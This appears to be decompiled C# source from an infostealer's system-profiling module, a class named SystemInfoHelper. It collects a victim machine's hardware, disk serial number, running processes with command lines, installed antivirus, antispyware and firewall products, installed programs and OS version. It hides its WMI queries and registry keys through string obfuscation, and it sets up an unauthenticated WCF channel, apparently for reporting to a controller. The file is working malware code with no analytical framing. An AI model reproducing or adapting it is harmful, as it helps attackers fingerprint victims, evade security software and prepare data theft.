using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Management;
using System.Runtime.CompilerServices;
using System.ServiceModel;
using System.ServiceModel.Channels;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using System.Xml;
using Microsoft.Win32;

// Token: 0x02000024 RID: 36
public static class SystemInfoHelper
{
	// Token: 0x060000C6 RID: 198 RVA: 0x0000967C File Offset: 0x00007A7C
	public static System.ServiceModel.Channels.Binding CreateBind()
	{
		return new NetTcpBinding
		{
			MaxReceivedMessageSize = 2147483647L,
			MaxBufferPoolSize = 2147483647L,
			CloseTimeout = TimeSpan.FromMinutes(30.0),
			OpenTimeout = TimeSpan.FromMinutes(30.0),
			ReceiveTimeout = TimeSpan.FromMinutes(30.0),
			SendTimeout = TimeSpan.FromMinutes(30.0),
			TransferMode = TransferMode.Buffered,
			ReaderQuotas = new XmlDictionaryReaderQuotas
			{
				MaxDepth = 44567654,
				MaxArrayLength = int.MaxValue,
				MaxBytesPerRead = int.MaxValue,
				MaxNameTableCharCount = int.MaxValue,
				MaxStringContentLength = int.MaxValue
			},
			Security = new NetTcpSecurity
			{
				Mode = SecurityMode.None,
				Message = new MessageSecurityOverTcp
				{
					ClientCredentialType = MessageCredentialType.None
				}
			}
		};
	}

	// Token: 0x060000C7 RID: 199 RVA: 0x0000977C File Offset: 0x00007B7C
	public static List<Entity3> GetProcessors()
	{
		List<Entity3> list = new List<Entity3>();
		try
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELSystem.Windows.FormsECT * FRSystem.Windows.FormsOM WinSystem.Windows.Forms32_ProcSystem.Windows.Formsessor".Replace("System.Windows.Forms", string.Empty)))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						try
						{
							list.Add(new Entity3
							{
								Id1 = (managementObject[new string(new char[]
								{
									'N',
									'a',
									'm',
									'e'
								})] as string),
								Id2 = Convert.ToString(managementObject[new string(new char[]
								{
									'N',
									'u',
									'm',
									'b',
									'e',
									'r',
									'O',
									'f',
									'C',
									'o',
									'r',
									'e',
									's'
								})]),
								Id3 = Entity14.Id1
							});
						}
						catch
						{
						}
					}
				}
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x060000C8 RID: 200 RVA: 0x000098C8 File Offset: 0x00007CC8
	public static List<Entity3> GetGraphicCards()
	{
		List<Entity3> list = new List<Entity3>();
		try
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("roSystem.Linqot\\CISystem.LinqMV2".Replace("System.Linq", string.Empty), "SELSystem.LinqECT * FRSystem.LinqOM WinSystem.Linq32_VideoCoSystem.Linqntroller".Replace("System.Linq", string.Empty)))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						try
						{
							uint num = Convert.ToUInt32(managementObject["AdapterRAM"]);
							bool flag = num > 0U;
							if (flag)
							{
								list.Add(new Entity3
								{
									Id1 = (managementObject["Name"] as string),
									Id2 = num.ToString(),
									Id3 = Entity14.Id2
								});
							}
						}
						catch (Exception ex)
						{
						}
					}
				}
			}
		}
		catch (Exception ex2)
		{
		}
		return list;
	}

	// Token: 0x060000C9 RID: 201 RVA: 0x00009A1C File Offset: 0x00007E1C
	public static List<Entity4> GetBrowsers()
	{
		List<Entity4> list = new List<Entity4>();
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\WOW6432Node\\Clients\\StartMenuInternet");
			bool flag = registryKey == null;
			if (flag)
			{
				registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Clients\\StartMenuInternet");
			}
			string[] subKeyNames = registryKey.GetSubKeyNames();
			for (int i = 0; i < subKeyNames.Length; i++)
			{
				Entity4 entity = new Entity4();
				RegistryKey registryKey2 = registryKey.OpenSubKey(subKeyNames[i]);
				entity.Id1 = (string)registryKey2.GetValue(null);
				RegistryKey registryKey3 = registryKey2.OpenSubKey("shell\\open\\command");
				entity.Id3 = registryKey3.GetValue(null).ToString().StripQuotes();
				bool flag2 = entity.Id3 != null;
				if (flag2)
				{
					entity.Id2 = FileVersionInfo.GetVersionInfo(entity.Id3).FileVersion;
				}
				else
				{
					entity.Id2 = "Unknown Version";
				}
				list.Add(entity);
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x060000CA RID: 202 RVA: 0x00009B30 File Offset: 0x00007F30
	public static string GetSerialNumber()
	{
		try
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELESystem.ManagementCT * FRSystem.ManagementOM WiSystem.Managementn32_DisSystem.ManagementkDrivSystem.Managemente".Replace("System.Management", string.Empty)))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						try
						{
							return managementObject["SerialNumber"] as string;
						}
						catch
						{
						}
					}
				}
			}
		}
		catch
		{
		}
		return string.Empty;
	}

	// Token: 0x060000CB RID: 203 RVA: 0x00009C18 File Offset: 0x00008018
	public static List<string> ListOfProcesses()
	{
		List<string> list = new List<string>();
		try
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELSystem.Text.RegularExpressionsECT * FRSystem.Text.RegularExpressionsOM Win32_PSystem.Text.RegularExpressionsrocess WSystem.Text.RegularExpressionshere SessSystem.Text.RegularExpressionsionId='".Replace("System.Text.RegularExpressions", string.Empty) + Process.GetCurrentProcess().SessionId + "'"))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						try
						{
							List<string> list2 = list;
							string[] array = new string[6];
							array[0] = new string(new char[]
							{
								'I',
								'D',
								':',
								' '
							});
							int num = 1;
							object obj = managementObject[new string(new char[]
							{
								'P',
								'r',
								'o',
								'c',
								'e',
								's',
								's',
								'I',
								'd'
							})];
							array[num] = ((obj != null) ? obj.ToString() : null);
							array[2] = new string(new char[]
							{
								',',
								' ',
								'N',
								'a',
								'm',
								'e',
								':',
								' '
							});
							int num2 = 3;
							object obj2 = managementObject[new string(new char[]
							{
								'N',
								'a',
								'm',
								'e'
							})];
							array[num2] = ((obj2 != null) ? obj2.ToString() : null);
							array[4] = new string(new char[]
							{
								',',
								' ',
								'C',
								'o',
								'm',
								'm',
								'a',
								'n',
								'd',
								'L',
								'i',
								'n',
								'e',
								':',
								' '
							});
							int num3 = 5;
							object obj3 = managementObject[new string(new char[]
							{
								'C',
								'o',
								'm',
								'm',
								'a',
								'n',
								'd',
								'L',
								'i',
								'n',
								'e'
							})];
							array[num3] = ((obj3 != null) ? obj3.ToString() : null);
							list2.Add(string.Concat(array));
						}
						catch
						{
						}
					}
				}
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x060000CC RID: 204 RVA: 0x00009E30 File Offset: 0x00008230
	public static List<string> GetVs()
	{
		List<string> list = new List<string>();
		try
		{
			foreach (string str in new string(new char[]
			{
				'A',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'n',
				't',
				'i',
				'v',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'i',
				'r',
				'u',
				's',
				'P',
				'r',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'o',
				'd',
				'u',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'c',
				't',
				'|',
				'A',
				'n',
				't',
				'i',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'S',
				'p',
				'y',
				'W',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'a',
				'r',
				'e',
				'P',
				'r',
				'o',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'd',
				'u',
				'c',
				't',
				'|',
				'F',
				'i',
				'r',
				'e',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'w',
				'a',
				'l',
				'l',
				'P',
				'r',
				'o',
				'd',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'u',
				'c',
				't'
			}).Replace("FileSystem", string.Empty).Split(new char[]
			{
				'|'
			}))
			{
				try
				{
					using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(new string(new char[]
					{
						'R',
						'O',
						'O',
						'T',
						'\\',
						'S',
						'e',
						'c',
						'u',
						'r',
						'i',
						't',
						'y',
						'C',
						'e',
						'n',
						't',
						'e',
						'r'
					}), new string(new char[]
					{
						'S',
						'E',
						'L',
						'E',
						'C',
						'T',
						' ',
						'*',
						' ',
						'F',
						'R',
						'O',
						'M',
						' '
					}) + str))
					{
						using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
						{
							foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
							{
								try
								{
									bool flag = !list.Contains(managementBaseObject[new string(new char[]
									{
										'd',
										'i',
										's',
										'p',
										'l',
										'a',
										'y',
										'N',
										'a',
										'm',
										'e'
									})] as string);
									if (flag)
									{
										list.Add(managementBaseObject[new string(new char[]
										{
											'd',
											'i',
											's',
											'p',
											'l',
											'a',
											'y',
											'N',
											'a',
											'm',
											'e'
										})] as string);
									}
								}
								catch
								{
								}
							}
						}
					}
				}
				catch
				{
				}
			}
			foreach (string str2 in new string(new char[]
			{
				'A',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'n',
				't',
				'i',
				'v',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'i',
				'r',
				'u',
				's',
				'P',
				'r',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'o',
				'd',
				'u',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'c',
				't',
				'|',
				'A',
				'n',
				't',
				'i',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'S',
				'p',
				'y',
				'W',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'a',
				'r',
				'e',
				'P',
				'r',
				'o',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'd',
				'u',
				'c',
				't',
				'|',
				'F',
				'i',
				'r',
				'e',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'w',
				'a',
				'l',
				'l',
				'P',
				'r',
				'o',
				'd',
				'F',
				'i',
				'l',
				'e',
				'S',
				'y',
				's',
				't',
				'e',
				'm',
				'u',
				'c',
				't'
			}).Replace("FileSystem", string.Empty).Split(new char[]
			{
				'|'
			}))
			{
				try
				{
					using (ManagementObjectSearcher managementObjectSearcher2 = new ManagementObjectSearcher(new string(new char[]
					{
						'R',
						'O',
						'O',
						'T',
						'\\',
						'S',
						'e',
						'c',
						'u',
						'r',
						'i',
						't',
						'y',
						'C',
						'e',
						'n',
						't',
						'e',
						'r',
						'2'
					}), new string(new char[]
					{
						'S',
						'E',
						'L',
						'E',
						'C',
						'T',
						' ',
						'*',
						' ',
						'F',
						'R',
						'O',
						'M',
						' '
					}) + str2))
					{
						using (ManagementObjectCollection managementObjectCollection2 = managementObjectSearcher2.Get())
						{
							foreach (ManagementBaseObject managementBaseObject2 in managementObjectCollection2)
							{
								try
								{
									bool flag2 = !list.Contains(managementBaseObject2[new string(new char[]
									{
										'd',
										'i',
										's',
										'p',
										'l',
										'a',
										'y',
										'N',
										'a',
										'm',
										'e'
									})] as string);
									if (flag2)
									{
										list.Add(managementBaseObject2[new string(new char[]
										{
											'd',
											'i',
											's',
											'p',
											'l',
											'a',
											'y',
											'N',
											'a',
											'm',
											'e'
										})] as string);
									}
								}
								catch
								{
								}
							}
						}
					}
				}
				catch
				{
				}
			}
		}
		catch (Exception ex)
		{
		}
		return list;
	}

	// Token: 0x060000CD RID: 205 RVA: 0x0000A218 File Offset: 0x00008618
	public static List<string> GetProcessesByName(string[] parts)
	{
		List<string> list = new List<string>();
		try
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SSystem.ELECT * FRSystem.OM WiSystem.n32_ProcSystem.ess WherSystem.e SessiSystem.onId='".Replace("System.", string.Empty) + Process.GetCurrentProcess().SessionId + "'"))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						try
						{
							object obj = managementObject[new string(new char[]
							{
								'N',
								'a',
								'm',
								'e'
							})];
							string a = (obj != null) ? obj.ToString() : null;
							bool flag = a == string.Join("", parts);
							if (flag)
							{
								List<string> list2 = list;
								object obj2 = managementObject["ExecutablePath"];
								list2.Add((obj2 != null) ? obj2.ToString() : null);
							}
						}
						catch
						{
						}
					}
				}
			}
		}
		catch
		{
		}
		return list;
	}

	// Token: 0x060000CE RID: 206 RVA: 0x0000A370 File Offset: 0x00008770
	public static List<string> ListOfPrograms()
	{
		List<string> list = new List<string>();
		try
		{
			string name = new string(new char[]
			{
				'S',
				'O',
				'F',
				'T',
				'W',
				'A',
				'R',
				'E',
				'\\',
				'M',
				'i',
				'c',
				'r',
				'o',
				's',
				'o',
				'f',
				't',
				'\\',
				'W',
				'i',
				'n',
				'd',
				'o',
				'w',
				's',
				'\\',
				'C',
				'u',
				'r',
				'r',
				'e',
				'n',
				't',
				'V',
				'e',
				'r',
				's',
				'i',
				'o',
				'n',
				'\\',
				'U',
				'n',
				'i',
				'n',
				's',
				't',
				'a',
				'l',
				'l'
			});
			using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(name))
			{
				foreach (string name2 in registryKey.GetSubKeyNames())
				{
					try
					{
						using (RegistryKey registryKey2 = registryKey.OpenSubKey(name2))
						{
							string text = (string)((registryKey2 != null) ? registryKey2.GetValue(new string(new char[]
							{
								'D',
								'i',
								's',
								'p',
								'l',
								'a',
								'y',
								'N',
								'a',
								'm',
								'e'
							})) : null);
							string text2 = (string)((registryKey2 != null) ? registryKey2.GetValue(new string(new char[]
							{
								'D',
								'i',
								's',
								'p',
								'l',
								'a',
								'y',
								'V',
								'e',
								'r',
								's',
								'i',
								'o',
								'n'
							})) : null);
							bool flag = !string.IsNullOrEmpty(text) && !string.IsNullOrWhiteSpace(text2);
							if (flag)
							{
								text = text.Trim();
								text2 = text2.Trim();
								list.Add(Regex.Replace(text + " [" + text2 + "]", new string(new char[]
								{
									'[',
									'^',
									'\\',
									'u',
									'0',
									'0',
									'2',
									'0',
									'-',
									'\\',
									'u',
									'0',
									'0',
									'7',
									'F',
									']'
								}), string.Empty));
							}
						}
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
		return (from x in list
		orderby x
		select x).ToList<string>();
	}

	// Token: 0x060000CF RID: 207 RVA: 0x0000A564 File Offset: 0x00008964
	public static List<string> AvailableLanguages()
	{
		List<string> result = new List<string>();
		try
		{
			return (from InputLanguage lang in InputLanguage.InstalledInputLanguages
			select lang.Culture.EnglishName).ToList<string>();
		}
		catch
		{
		}
		return result;
	}

	// Token: 0x060000D0 RID: 208 RVA: 0x0000A5CC File Offset: 0x000089CC
	public static string CollectMemory()
	{
		string result = "Concat0 MConcatb oConcatr Concat0".Replace("Concat", string.Empty);
		try
		{
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELEMemoryCT * FMemoryROM WiMemoryn32_OperMemoryatingSMemoryystem".Replace("Memory", string.Empty)))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						try
						{
							double num = Convert.ToDouble(managementObject[new string(new char[]
							{
								'T',
								'o',
								't',
								'a',
								'l',
								'V',
								'i',
								's',
								'i',
								'b',
								'l',
								'e',
								'M',
								'e',
								'm',
								'o',
								'r',
								'y',
								'S',
								'i',
								'z',
								'e'
							})]);
							double num2 = num * 1024.0;
							double num3 = Math.Round(num / 1024.0, 2);
							result = string.Format("{0}{1}{2}", num3, new string(new char[]
							{
								' ',
								'M',
								'B',
								' ',
								'o',
								'r',
								' '
							}), num2).Replace(',', '.');
						}
						catch
						{
						}
					}
				}
			}
		}
		catch
		{
		}
		return result;
	}

	// Token: 0x060000D1 RID: 209 RVA: 0x0000A73C File Offset: 0x00008B3C
	public static string GetWindowsVersion()
	{
		try
		{
			string str;
			try
			{
				str = (Environment.Is64BitOperatingSystem ? "x64" : "x32");
			}
			catch (Exception)
			{
				str = "x86";
			}
			string text = SystemInfoHelper.<GetWindowsVersion>g__HKLM_GetString|11_0("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName");
			string text2 = SystemInfoHelper.<GetWindowsVersion>g__HKLM_GetString|11_0("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "CSDVersion");
			bool flag = !string.IsNullOrEmpty(text);
			if (flag)
			{
				return text + " " + str;
			}
		}
		catch (Exception ex)
		{
		}
		return string.Empty;
	}

	// Token: 0x060000D2 RID: 210 RVA: 0x0000A7E0 File Offset: 0x00008BE0
	[CompilerGenerated]
	internal static string <GetWindowsVersion>g__HKLM_GetString|11_0(string key, string value)
	{
		string result;
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(key);
			result = (((registryKey != null) ? registryKey.GetValue(value).ToString() : null) ?? string.Empty);
		}
		catch
		{
			result = string.Empty;
		}
		return result;
	}
}
